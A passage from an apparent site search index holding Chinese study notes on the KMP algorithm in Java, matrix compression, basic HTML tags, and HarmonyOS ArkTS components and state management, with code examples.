不相交集\r#\r第十一章 图论算法\r#\r第十二章 算法设计技巧\r#\r第十三章 摊还分析\r#\r第十四章 高级数据结构及其实现\r#\r矩阵的压缩存储\r#\r对称矩阵\r#\r计算$$\\large a_{i,j}$$在压缩矩阵中的下标\n三角矩阵\r#\r+1个空间是为了存储这个常数c\n三对角矩阵\r#\r数组下标$$k=3*(i-1)-1+j-i+1=2*i+j-3$$\n$$i = (k+1)/3 + 1$$\n$$j = k-2*i+3$$\n稀疏矩阵\r#\r稀疏矩阵在采用压缩存储后将会失去随机存储的功能。因为在这种矩阵中，非零元素的分布是没有规律的，为了压缩存储，就将每一个非零元素的值和它所在的行、列号做为一个结点存放在一起，这样的结点组成的线性表中叫三元组表，它已不是简单的向量，所以无法用下标直接存取矩阵中的元素。\nKMP算法\r#\r理解三个概念：前缀、后缀、部分匹配值\n手搓步骤\r#\r计算模式串中所有前缀的部分匹配值\n匹配成功则向后推进，匹配失败则根据next[]数组回退（j-1 - next[j-1]）步。\n算法实现\r#\rpublic class KMP2 { private int next[]; private String pat; public static void main(String[] args) { KMP2 kmp = new KMP2(\u0026#34;issip\u0026#34;); int res = kmp.search(\u0026#34;mississippi\u0026#34;); System.out.println(\u0026#34;res: \u0026#34; + res); } public KMP2(String pat) { this.pat = pat; getNext(pat); } public void getNext(String pat) { char[] p = pat.toCharArray(); next = new int[p.length]; next[0] = -1; int j = 0; int k = -1; while (j \u0026lt; p.length - 1) { if (k == -1 || p[j] == p[k]) { next[++j] = ++k; } else { k = next[k]; } } } public int search(String text) { char[] t = text.toCharArray(); char[] p = pat.toCharArray(); int i = 0; // 主串位置 int j = 0; // 模式串位置 while (i \u0026lt; t.length \u0026amp;\u0026amp; j \u0026lt; p.length) { if (j == -1 || t[i] == p[j]) { i++; j++; } else { j = next[j]; // j回退 } } if (j == p.length) { return i-j; } else { return -1; } } } 利用动态规划 二维dp 实现KMP算法\n有限状态机\nlabuladong KMP算法详解\npublic class KMP { private int[][] dp; private String pat; public static void main(String[] args) { KMP kmp = new KMP(\u0026#34;issip\u0026#34;); int res = kmp.search(\u0026#34;mississippi\u0026#34;); System.out.println(\u0026#34;res: \u0026#34; + res); } public KMP(String pat) { this.pat = pat; int M = pat.length(); // dp[状态][字符] = 下个状态 dp = new int[M][256]; // base case dp[0][pat.charAt(0)] = 1; // 影子状态 X 初始为 0 int X = 0; // 构建状态转移图（稍改的更紧凑了） for (int j = 1; j \u0026lt; M; j++) { for (int c = 0; c \u0026lt; 256; c++) { if (pat.charAt(j) == c) { dp[j][c] = j + 1; } else { dp[j][c] = dp[X][c]; } } // 更新影子状态 X = dp[X][pat.charAt(j)]; } } public int search(String txt) { int M = pat.length(); int N = txt.length(); // pat 的初始态为 0 int j = 0; for (int i = 0; i \u0026lt; N; i++) { // 计算 pat 的下一个状态 j = dp[j][txt.charAt(i)]; // 到达终止态，返回结果 if (j == M) return i - M + 1; } // 没到达终止态，匹配失败 return -1; } } 回溯算法\r#\r八皇后问题\r#\r该问题是十九世纪著名的数学家高斯1850年提出： 在8*8格的国际象棋上摆放八个皇后，使其不能互相攻击，即任意两个皇后都不能处于同一行、同一列或同一斜线上，问有多少种摆法。\n"},{"id":79,"href":"/docs/learm/%E4%B8%8A%E8%AF%BE/%E7%BD%91%E9%A1%B5%E5%88%B6%E4%BD%9C/","title":"网页制作","section":"class notes","content":"\rHTML学习笔记\r#\r一、协议\r#\r首先说明我的文本遵从的是html协议\r#\r\u0026lt;!doctype html\u0026gt; 二、html解析的范围\r#\r\u0026lt;html\u0026gt; \u0026lt;html\u0026gt; 三、head标签\r#\r这里一般会写上编码格式(li)\n\u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;utf=-8\u0026#34;\u0026gt;\u0026lt;/head\u0026gt; 四、标签，段落，链接, 图像\r#\r标签\r#\r\u0026lt;h1\u0026gt;标签分为h1到h6\u0026lt;/h1\u0026gt; 段落\r#\r​\t注意，如果不想在开启段落进行换行是加入标签\n\u0026lt;p\u0026gt;段落\u0026lt;/p\u0026gt; 链接\r#\r链接语法： \u0026lt;a href=\u0026#34;url\u0026#34;\u0026gt;链接文本\u0026lt;/a\u0026gt; 例子: \u0026lt;a href=\u0026#34;https://www.baidu.com\u0026#34;\u0026gt;这里相当于链接的按键\u0026lt;/a\u0026gt; 图像\r#\r\u0026lt;img loading=\u0026#34;lazy\u0026#34; src=\u0026#34;图片路径\u0026#34; width=\u0026#34;宽\u0026#34; height=\u0026#34;高\u0026#34;\u0026gt; 五、加粗以及上下标斜体,换行\r#\r加粗\r#\r\u0026lt;big\u0026gt;\u0026lt;/big\u0026gt;（放大字体） \u0026lt;smart\u0026gt;\u0026lt;/smart\u0026gt;(缩小字体) \u0026lt;b\u0026gt;\u0026lt;/b\u0026gt; \u0026lt;strong\u0026gt;\u0026lt;/strongs\u0026gt; 斜体\r#\r\u0026lt;em\u0026gt;\u0026lt;/em\u0026gt; 上标\r#\r\u0026lt;sup\u0026gt;\u0026lt;/sup\u0026gt; 下标\r#\r\u0026lt;sub\u0026gt;\u0026lt;/sub\u0026gt; 换行\r#\r\u0026lt;br\u0026gt; 六、对空行进行控制\r#\r空行控制\r#\r\u0026lt;pre\u0026gt;\u0026lt;/pre\u0026gt; 七、地址，\r#\r填写信息的标签\r#\r\u0026lt;address\u0026gt; Written by \u0026lt;a href=\u0026#34;mailto:webmaster@example.com\u0026#34;\u0026gt;Jon Doe\u0026lt;/a\u0026gt;.\u0026lt;br\u0026gt; Visit us at:\u0026lt;br\u0026gt; Example.com\u0026lt;br\u0026gt; Box 564, Disneyland\u0026lt;br\u0026gt; USA \u0026lt;/address\u0026gt; 隐藏显示显示内容\r#\r相当于将鼠标移动到文字上，会显示隐藏内容.\n\u0026lt;abbr title=\u0026#34;隐藏后鼠标方向要显示的信息\u0026#34;\u0026gt;ect.\u0026lt;/abbr\u0026gt; \u0026lt;acronym title=\u0026#34;\u0026#34;\u0026gt;\u0026lt;/acronym\u0026gt; \u0026lt;!doctype Html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;This is a head\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;pre\u0026gt; Hello world \u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;https://www.jianshu.com/\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;\u0026lt;h1\u0026gt;\u0026lt;acronym title=\u0026#34;点击进入网站\u0026#34;\u0026gt;Goto\u0026lt;/acronym\u0026gt;\u0026lt;/h1\u0026gt;\u0026lt;/strong\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 八、文字方向打印\r#\r\u0026lt;bdo dir=\u0026#34;\u0026#34;\u0026gt;\u0026lt;/bdo\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;菜鸟教程(runoob.com)\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;该段落文字从左到右显示。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;bdo dir=\u0026#34;rtl\u0026#34;\u0026gt;该段落文字从右到左显示。\u0026lt;/bdo\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 九、标签属性\r#\r属性 eg: \u0026lt;a href=\u0026#34;https://www.baidu.com(这是属性的值，href为属性)\u0026#34;\u0026gt;你好(这里是元素)\u0026lt;/a\u0026gt; href属性指定网页链接等 id属性 定义属性的唯一ID title属性 类似于工作标签 style属性 描述元素的行内样式 target属性，可以用于设置新窗口在何处显示 eg: \u0026lt;a href=\u0026#34;https://www.runoob.com/\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noopener noreferrer\u0026#34;\u0026gt;访问菜鸟教程!\u0026lt;/a\u0026gt; base属性：定义页面中所有链接的默认链接地址 列表\r#\r有序列表 type 提供了 a: 小写字母 A: 大写字母 i: 小写罗马数字 I: 大写罗马数字 1: 数字 \u0026lt;ol\u0026gt; \u0026lt;li\u0026gt;选择您要是使用的网上银行\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;显示您的应付总价，点击“确认无误，付款”\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;确定您在有银行的预留信息，点击确定\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;输入你的网银账号、登录密码、验证码\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;支付成功，提示“”已完成付款\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; 无序列表 circle disc square \u0026lt;ul type=\u0026#34;disc\u0026#34;\u0026gt; \u0026lt;li\u0026gt;货到付款\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;财付通\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;支付宝\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;网银在线\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; "},{"id":80,"href":"/docs/learm/math/%E9%B8%A1%E6%9D%82%E5%85%AC%E5%BC%8F/","title":"鸡杂公式","section":"math","content":"\r指数\r#\r$$ \\begin{aligned}\na^m=b , m=\\log_{a}{b} \\\\ a^{\\log_a{b}}=b \\\\ x^m=e^{\\ln x^m}=e^{m\\ln x} \\end{aligned} $$\n"},{"id":81,"href":"/docs/code/harmony/tabbar/","title":"鸿蒙开发-TbaBar","section":"鸿蒙","content":"class ToolBarItem { defaultIcon: string | Resource activeIcon: string | Resource label: string } @Entry @Component struct Index { @State activeIndex: number = 0 toolBars: ToolBarItem[] = [ { defaultIcon: $r(\u0026#39;app.media.home\u0026#39;), activeIcon: $r(\u0026#39;app.media.home_select\u0026#39;), label: \u0026#39;首页\u0026#39; }, { defaultIcon: $r(\u0026#39;app.media.project\u0026#39;), activeIcon: $r(\u0026#39;app.media.project_select\u0026#39;), label: \u0026#39;项目\u0026#39; }, { defaultIcon: $r(\u0026#39;app.media.interview\u0026#39;), activeIcon: $r(\u0026#39;app.media.interview_select\u0026#39;), label: \u0026#39;面经\u0026#39; }, { defaultIcon: $r(\u0026#39;app.media.mine\u0026#39;), activeIcon: $r(\u0026#39;app.media.mine_select\u0026#39;), label: \u0026#39;我的\u0026#39; } ] @Builder TabBarBuilder(item: ToolBarItem, index: number) { Column() { Image(this.activeIndex === index ? item.activeIcon : item.defaultIcon) .width(24) Text(item.label) .fontSize(12) .margin({ top: 4 }) .lineHeight(12) .fontColor(this.activeIndex === index ? \u0026#39;#000\u0026#39; : \u0026#39;#aaa\u0026#39;) } } build() { Tabs({ index: this.activeIndex }) { ForEach(this.toolBars, (item: ToolBarItem, index: number) =\u0026gt; { TabContent() { Text(index.toString()) } .tabBar(this.TabBarBuilder(item, index)) }) } .barPosition(BarPosition.End) .onChange(index =\u0026gt; this.activeIndex = index) } } "},{"id":82,"href":"/docs/code/harmony/%E5%85%A5%E9%97%A8/","title":"鸿蒙开发-入门","section":"鸿蒙","content":"\r参考\r#\r鸿蒙应用开发指南 官方开发说明\n页面组件\r#\r@Entry @Component struct Index { // 工程默认显示 `Index` 页面组件 // build 是声明UI的位置 build() { Text(\u0026#39;页面组件\u0026#39;) } } 自定义组件\n// 定义 `Footer` 组件 @Component struct Footer { build() { Text(\u0026#39;自定义组件\u0026#39;) } } @Entry @Component struct Index { build() { Column(){ // 使用 `Footer` 组件 Footer() } } } 导出使用\n@Component export default struct Footer { build() { Text(\u0026#39;自定义组件\u0026#39;) } } import Footer from \u0026#39;./components/Footer.ets\u0026#39; @Entry @Component struct Index { build() { Column(){ // 使用 `Footer` 组件 Footer() } } } 系统组件\r#\r参考基础组件\n样式处理\r#\r链式\r#\r样式属性 @Entry @Component struct Index { build() { Text(\u0026#39;演示\u0026#39;) .backgroundColor(\u0026#39;red\u0026#39;) .fontSize(50) .width(\u0026#39;100%\u0026#39;) .height(100) } } 枚举值 @Entry @Component struct Index { build() { Text(\u0026#39;演示\u0026#39;) .fontSize(50) .width(\u0026#39;100%\u0026#39;) .height(100) .backgroundColor(Color.Blue) .textAlign(TextAlign.Center) .fontColor(Color.White) } } 常用\r#\r伸缩 layoutWeight(flex: number) 占剩余空间多少份，可以理解成CSS的 flex: 1\n@Entry @Component struct Index { build() { Row(){ Text(\u0026#39;left\u0026#39;) .layoutWeight(1) .backgroundColor(\u0026#39;red\u0026#39;) Text(\u0026#39;right\u0026#39;) .layoutWeight(2) .backgroundColor(\u0026#39;green\u0026#39;) } .width(\u0026#39;100%\u0026#39;) } } 等比例，设置元素宽高比 aspectRatio(ratio: number)\n@Entry @Component struct Index { build() { Text(\u0026#39;left\u0026#39;) .width(\u0026#39;50%\u0026#39;) // 宽高比例 .aspectRatio(1) .backgroundColor(\u0026#39;red\u0026#39;) } } 样式复用@Style\r#\r// 全局 @Styles function functionName() { ... } @Entry @Component sturt Index{ // 组件内 @Styles functionName() { ... } build() { Text(\u0026#39;Text\u0026#39;) .functionName() } } 例如，简单吧.\n我似乎懂了,@Style只能用于公共样式，没法为空间设置单独的样式，所以还是用@Extends\n@Entry @Component struct Index { @State count: number = 10 // 不需要 `function` 关键字，覆盖全局 @Styles sameStyle (){ .backgroundColor(Color.Pink) .onClick(() =\u0026gt; { this.count += 10 }) } build() { Column() { Text(this.count.toString()) .width(100) .height(50) .margin({ bottom: 10 }) .textAlign(TextAlign.Center) .sameStyle() Button(\u0026#39;+1\u0026#39;) .sameStyle() } .height(\u0026#39;100%\u0026#39;) .width(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) } } 样式复用@Extends\r#\r// 全局 原生组件 参数 // ↓ ↓ ↓ @Extend(Text) function functionName(w: number) { .width(w) } 例如\nimport promptAction from \u0026#39;@ohos.promptAction\u0026#39; @Extend(Text) function myClick(color: string, cb: () =\u0026gt; void) { .backgroundColor(color) .width(100) .height(50) .textAlign(TextAlign.Center) .borderRadius(25) .onClick(() =\u0026gt; cb()) } @Entry @Component struct Other { @State color: string = \u0026#39;#ccc\u0026#39; build() { Column({ space: 20 }) { Text(\u0026#39;Text1\u0026#39;) .myClick(this.color, () =\u0026gt; { this.color = \u0026#39;#069\u0026#39; }) Text(\u0026#39;Text2\u0026#39;) .myClick(\u0026#39;green\u0026#39;, () =\u0026gt; { promptAction.showToast({ message: \u0026#39;做其他事~\u0026#39; }) }) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) } } 样式多态\r#\rstateStyles 是属性方法，可以根据UI内部状态来设置样式，类似于 css 伪类，但语法不同。\nfocused：获焦态。 normal：正常态。 pressed：按压态。 disabled：不可用态。 normal和pressel这两用的比较多\nimport promptAction from \u0026#39;@ohos.promptAction\u0026#39; // 胶囊按钮 @Extend(Text) function capsule(){ .height(40) .borderRadius(20) .backgroundColor(Color.Gray) .padding({ left: 15, right: 15 }) .margin({ bottom: 15 }) } @Entry @Component struct Index { @State disabled: boolean = false @State focused: boolean = false build() { Column() { // Button TextInput 默认开启获取焦点，页面中默认第一个这样的元素获取焦点 // Button 比较多限制，一个是默认开启获取焦点能看，二是禁用状态下样式无法修改 // Button(\u0026#39;Button\u0026#39;).focusable(false) Text(\u0026#39;toggle disabled：\u0026#39; + this.disabled) .capsule() .onClick(()=\u0026gt;{ this.disabled = !this.disabled }) Text(\u0026#39;toggle focused：\u0026#39; + this.focused) .capsule() .onClick(()=\u0026gt;{ this.focused = !this.focused }) Text(\u0026#39;clickMe\u0026#39;) .capsule() .enabled(!this.disabled) .focusable(this.focused) .onClick(() =\u0026gt; { promptAction.showToast({ message: \u0026#39;click\u0026#39; }) }) .fontColor(\u0026#39;#fff\u0026#39;) .stateStyles({ normal: { .backgroundColor(Color.Blue) }, focused: { .backgroundColor(Color.Red) }, disabled: { .backgroundColor(Color.Black) }, pressed: { .backgroundColor(Color.Orange) } }) } } } 组件状态\r#\rclass 语法\r#\r这个简单。首先，class 创建对象和 class 类型\nclass Person { age: number; name: string; constructor(name: string, age: number) { this.name = name this.age = age } } // 当类型使用和构当造函数使用 const p: Person = new Person(\u0026#39;jack\u0026#39;, 18) // 当类型使用这种使用后续居多，我们使用字面量对象居多，可以省略 constructor const p1: Person = { name: \u0026#39;tom\u0026#39;, age: 20 } implements 实现 interface 接口\ninterface IPerson { name: string, age: number, say: () =\u0026gt; void } // 实现 IPerson 接口，需要符合接口约定 class Person implements IPerson{ age: number; name: string; constructor(name: string, age: number) { this.name = name this.age = age } say () { promptAction.showToast({ message: this.name }) } } 继承\nclass HmPerson extends Person { github: string = \u0026#39;https://github.com/zhousg\u0026#39; coding () { promptAction.showToast({ message: this.name + \u0026#39;: coding\u0026#39; }) } } 界面渲染\r#\r条件渲染\r#\r这个就不用多说了吧，Vue和React都有学过\n循环渲染\r#\r语法 ，其实很多都是差不多的\nForEach( // 数据源 arr: Array, // 组件生成函数 itemGenerator: (item: Array, index?: number) =\u0026gt; void, // 键值生成函数 keyGenerator?: (item: Array, index?: number): string =\u0026gt; string ) 来个实例\nclass User { id: string name: string age: number } @Entry @Component struct Index { @State userList: User[] = [] build() { Scroll() { Column({ space: 20 }) { // 循环渲染 ForEach( // 1. 数据源 this.userList, // 2. 组件生成函数 (item: User) =\u0026gt; { // 内容 Text(`${item.name} 今年 ${item.age} 岁`) }, // 3. 键值生成函数 item =\u0026gt; item.id ) Button(\u0026#39;加载更多\u0026#39;) .onClick(() =\u0026gt; { const arr: User[] = [] for (let index = 0; index \u0026lt; 10; index++) { arr.push({ id: Math.random().toString(), name: \u0026#39;jack\u0026#39;, age: Math.ceil(Math.random() * 100) }) } this.userList.push(...arr) }) } } .width(\u0026#39;100%\u0026#39;) } } 注意:\n其中的key尽量别缺，也尽量不要使用index，使用唯一的id之类的\n"},{"id":83,"href":"/docs/code/harmony/%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86/","title":"鸿蒙开发-状态管理","section":"鸿蒙","content":"\r自定义构建函数\r#\r@Builder\r#\r@Builder\n组件内 @Builder MyBuilderFunction() {} this.MyBuilderFunction() 全局 @Builder function MyGlobalBuilderFunction() {} MyGlobalBuilderFunction() 参数传递 @Builder MyBuilderFunction( title: string ) {} this.MyBuilderFunction(\u0026#39;Title\u0026#39;) 反正就跟自定义控件差不多太多？ 使用支持传参使其更加灵活\nMyBuilderFunction(params: { title: string }){} @BuilderParam\r#\r这个简单, 跟compose 差不多太多\n@Component struct PanelComp { title: string more: string @BuilderParam panelContent: () =\u0026gt; void @BuilderParam panelFooter: () =\u0026gt; void build() { Column() { Row() { Text(this.title) .layoutWeight(1) .fontWeight(600) Row() { Text(this.more) .fontSize(14) .fontColor(\u0026#39;#666666\u0026#39;) Image($r(\u0026#39;app.media.ic_public_arrow_right\u0026#39;)) .width(16) .fillColor(\u0026#39;#666666\u0026#39;) } } .padding(10) Row() { this.panelContent() } .height(100) Row() { this.panelFooter() } .height(50) } .borderRadius(12) .backgroundColor(\u0026#39;#fff\u0026#39;) } } @Entry @Component struct Index { @Builder ContentBuilderA() { Text(\u0026#39;评价内容\u0026#39;) } @Builder FooterBuilderA() { Text(\u0026#39;评价底部\u0026#39;) } build() { Column() { GridRow({ columns: 2, gutter: 15 }) { GridCol({ span: 2 }) { PanelComp({ title: \u0026#39;评价（2000+）\u0026#39;, more: \u0026#39;好评率98%\u0026#39;, panelFooter: this.FooterBuilderA, panelContent: this.ContentBuilderA }) } // GridCol() { // PanelComp({ title: \u0026#39;推荐\u0026#39;, more: \u0026#39;查看全部\u0026#39; }){ // Text(\u0026#39;推荐内容\u0026#39;) // } // } // // GridCol() { // PanelComp({ title: \u0026#39;体验\u0026#39;, more: \u0026#39;4 条测评\u0026#39; }){ // Text(\u0026#39;体验内容\u0026#39;) // } // } } } .height(\u0026#39;100%\u0026#39;) .padding(15) .backgroundColor(\u0026#39;#f5f5f5\u0026#39;) } } 状态共享\r#\r父子单向\r#\r@Prop 装饰的变量可以和父组件建立单向的同步关系。可变，但是不会传回父组件\n@Entry @Component struct Index { @State money: number = 0 build() { Column({ space: 20 }){ Text(\u0026#39;父组件：\u0026#39; + this.money) .onClick(() =\u0026gt; { this.money ++ }) Child({ money: this.money }) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .alignItems(HorizontalAlign.Center) .justifyContent(FlexAlign.Center) } } @Component struct Child { @Prop money: number build() { Text(\u0026#39;子组件：\u0026#39; + this.money) .onClick(() =\u0026gt; { this.money ++ }) } } 注意: @Prop支持类型 string、number、boolean、enum 类型\n父子共享\r#\r子组件中被@Link装饰的变量与其父组件中对应的数据源建立双向数据绑定。\n简单类型 string number boolean enum @Entry @Component struct Index { @State money: number = 0 build() { Column({ space: 20 }){ Text(\u0026#39;父组件：\u0026#39; + this.money) .onClick(() =\u0026gt; { this.money ++ }) Child({ money: $money }) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .alignItems(HorizontalAlign.Center) .justifyContent(FlexAlign.Center) } } @Component struct Child { @Link money: number build() { Text(\u0026#39;子组件：\u0026#39; + this.money) .onClick(() =\u0026gt; { this.money ++ }) } } 复杂类型 Object class class Person { name: string age: number } @Entry @Component struct Index { @State person: Person = { name: \u0026#39;jack\u0026#39;, age: 18 } build() { Column({ space: 20 }){ Text(\u0026#39;父组件：\u0026#39; + `${this.person.name} 今年 ${ this.person.age } 岁`) .onClick(() =\u0026gt; { this.person.age ++ }) Child({ person: $person }) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .alignItems(HorizontalAlign.Center) .justifyContent(FlexAlign.Center) } } @Component struct Child { @Link person: Person build() { Text(\u0026#39;子组件：\u0026#39; + `${this.person.name} 今年 ${ this.person.age } 岁`) .onClick(() =\u0026gt; { this.person.age ++ }) } } 注意: 父组件传值的时候需要 this. 改成 $，子组件 @Link 修饰数据\n后代组件\r#\r@Provide 和 @Consume，应用于与后代组件的双向数据同步，应用于状态数据在多个层级之间传递的场景。\n通过相同的变量名绑定 @Entry @Component struct Index { @Provide money: number = 0 build() { Column({ space: 20 }) { Text(\u0026#39;父组件：\u0026#39; + this.money) .onClick(() =\u0026gt; { this.money++ }) Parent() } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) } } @Component struct Parent { @Consume money: number build() { Column({ space: 20 }) { Text(\u0026#39;父组件：\u0026#39; + this.money) .onClick(() =\u0026gt; { this.money++ }) Child() } } } @Component struct Child { @Consume money: number build() { Text(\u0026#39;子组件：\u0026#39; + this.money) .onClick(() =\u0026gt; { this.money++ }) } } 状态监听器\r#\r如果开发者需要关注某个状态变量的值是否改变，可以使用 @Watch 为状态变量设置回调函数。\n@State、@Prop、@Link 等装饰器在 @Watch 装饰之前 import promptAction from \u0026#39;@ohos.promptAction\u0026#39; @Component struct Child { @Prop @Watch(\u0026#39;onActiveIndex\u0026#39;) activeIndex: number onActiveIndex() { promptAction.showToast({ message: \u0026#39;监听变化\u0026#39; }) } build() { Column() { Text(\u0026#39;Child\u0026#39; + this.activeIndex) } } } @Entry @Component struct Index { @State activeIndex: number = 0 onChange (index: number) { this.activeIndex = index promptAction.showToast({ message: \u0026#39;点击\u0026#39; }) } build() { Navigation() { Child({ activeIndex: this.activeIndex }) }.toolBar({ items: [ { value: \u0026#39;首页\u0026#39;, action: () =\u0026gt; this.onChange(0) }, { value: \u0026#39;我的\u0026#39;, action: () =\u0026gt; this.onChange(1) }, ] }) } } tip: 在第一次初始化的时候，@Watch装饰的方法不会被调用\n@Observed与@ObjectLink\r#\r修改嵌套对象的数据了更新UI\n类 class 数据模拟需要定义通过构造函数，使用 @Observed 修饰这个类 初始化数据：需要通过初始化构造函数的方式添加 通过 @ObjectLink 关联对象，可以直接修改被关联对象来更新UI 来看看我自己写的一个沟施例子吧\n@Entry @Component export default struct Index { students = [ new Student({ name: \u0026#34;张三\u0026#34;, gender: 1, age: 12 }), new Student({ name: \u0026#34;李四\u0026#34;, gender: 1, age: 13 }), new Student({ name: \u0026#34;小红\u0026#34;, gender: 0, age: 13 }) ] build() { Column() { ForEach(this.students, (s: Student) =\u0026gt; { Item({s}) }) } } } @Component struct Item { @ObjectLink s: Student OnLike() { this.s.age++ } build() { Row() { Text(`姓名: ${this.s.name} 年龄: ${this.s.age}`) .onClick(() =\u0026gt; { this.OnLike() }) }.width(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#34;#f5f5f5\u0026#34;) .borderRadius(5) } } @Observed class Student { gender: number age: number name: string constructor(s: Student) { for (const key in s) { this[key] = s[key] } } } 应用状态\r#\rUIAbility内状态-LocalStorage\r#\rLocalStorage 是页面级的UI状态存储，通过 @Entry 装饰器接收的参数可以在页面内共享同一个 LocalStorage 实例。 LocalStorage 也可以在 UIAbility 内，页面间共享状态。\n页面内共享 创建 LocalStorage 实例：const storage = new LocalStorage({ key: value }) 单向 @LocalStorageProp('user') 组件内可变 双向 @LocalStorageLink('user') 全 class User { name?: string age?: number } const storage = new LocalStorage({ user: { name: \u0026#39;jack\u0026#39;, age: 18 } }) @Entry(storage) @Component struct Index { @LocalStorageProp(\u0026#39;user\u0026#39;) user: User = {} build() { Column({ space: 15 }){ Text(\u0026#39;Index：\u0026#39;) Text(this.user.name + this.user.age) Divider() ChildA() Divider() ChildB() } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) } } @Component struct ChildA { @LocalStorageProp(\u0026#39;user\u0026#39;) user: User = {} build() { Column({ space: 15 }){ Text(\u0026#39;ChildA：\u0026#39;) Text(this.user.name + this.user.age) .onClick(()=\u0026gt;{ this.user.age ++ }) } } } @Component struct ChildB { @LocalStorageLink(\u0026#39;user\u0026#39;) user: User = {} build() { Column({ space: 15 }){ Text(\u0026#39;ChildB：\u0026#39;) Text(this.user.name + this.user.age) .onClick(()=\u0026gt;{ this.user.age ++ }) } } } 页面间共享 在 UIAbility 创建 LocalStorage 通过 loadContent 提供给加载的窗口 在页面使用 const storage = LocalStorage.GetShared() 得到实例，通过 @Entry(storage) 传入页面 entryAbility/EntryAbility.ts\n+ storage = new LocalStorage({ + user: { name: \u0026#39;jack\u0026#39;, age: 18 } + }) onWindowStageCreate(windowStage: window.WindowStage) { // Main window is created, set main page for this ability hilog.info(0x0000, \u0026#39;testTag\u0026#39;, \u0026#39;%{public}s\u0026#39;, \u0026#39;Ability onWindowStageCreate\u0026#39;); + windowStage.loadContent(\u0026#39;pages/Index\u0026#39;, this.storage , (err, data) =\u0026gt; { if (err.code) { hilog.error(0x0000, \u0026#39;testTag\u0026#39;, \u0026#39;Failed to load the content. Cause: %{public}s\u0026#39;, JSON.stringify(err) ?? \u0026#39;\u0026#39;); return; } hilog.info(0x0000, \u0026#39;testTag\u0026#39;, \u0026#39;Succeeded in loading the content. Data: %{public}s\u0026#39;, JSON.stringify(data) ?? \u0026#39;\u0026#39;); }); } models/index.ets\nexport class User { name?: string age?: number } pages/Index.ets\nimport { User } from \u0026#39;../models\u0026#39; const storage = LocalStorage.GetShared() @Entry(storage) @Component struct Index { @LocalStorageProp(\u0026#39;user\u0026#39;) user: User = {} build() { Column({ space: 15 }) { Text(\u0026#39;Index：\u0026#39;) Text(this.user.name + this.user.age) .onClick(()=\u0026gt;{ this.user.age ++ }) Navigator({ target: \u0026#39;pages/OtherPage\u0026#39; }){ Text(\u0026#39;Go Other Page\u0026#39;) } } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) } } pages/OtherPage.ets\nimport { User } from \u0026#39;../models\u0026#39; const storage = LocalStorage.GetShared() @Entry(storage) @Component struct OtherPage { @LocalStorageLink(\u0026#39;user\u0026#39;) user: User = {} build() { Column({ space: 15 }) { Text(\u0026#39;OtherPage：\u0026#39;) Text(this.user.name + this.user.age) .onClick(()=\u0026gt;{ this.user.age ++ }) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) } } 应用状态-AppStorage\r#\rAppStorage 是应用全局的UI状态存储，是和应用的进程绑定的，由UI框架在应用程序启动时创建，为应用程序UI状态属性提供中央存储。\n如果是初始化使用 AppStorage.SetOrCreate(key,value) 单向 @StorageProp('user') 组件内可变 双向 @StorageLink('user') 全局均可变 通过UI装饰器使用 import { User } from \u0026#39;../models\u0026#39; AppStorage.SetOrCreate\u0026lt;User\u0026gt;(\u0026#39;user\u0026#39;, { name: \u0026#39;jack\u0026#39;, age: 18 }) @Entry @Component struct Index { @StorageProp(\u0026#39;user\u0026#39;) // 可忽略，编辑器类型错误 user: User = {} build() { Column({ space: 15 }) { Text(\u0026#39;Index：\u0026#39;) Text(this.user.name + this.user.age) .onClick(() =\u0026gt; { this.user.age++ }) Divider() ChildA() } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) } } @Component struct ChildA { @StorageLink(\u0026#39;user\u0026#39;) user: User = {} build() { Column({ space: 15 }){ Text(\u0026#39;ChildA：\u0026#39;) Text(this.user.name + this.user.age) .onClick(()=\u0026gt;{ this.user.age ++ }) } } } 通过逻辑使用 AppStorage.Get\u0026lt;ValueType\u0026gt;(key) 获取数据 AppStorage.Set\u0026lt;ValueType\u0026gt;(key,value) 覆盖数据 const link: SubscribedAbstractProperty\u0026lt;ValueType\u0026gt; = AppStorage.Link(key) 覆盖数据 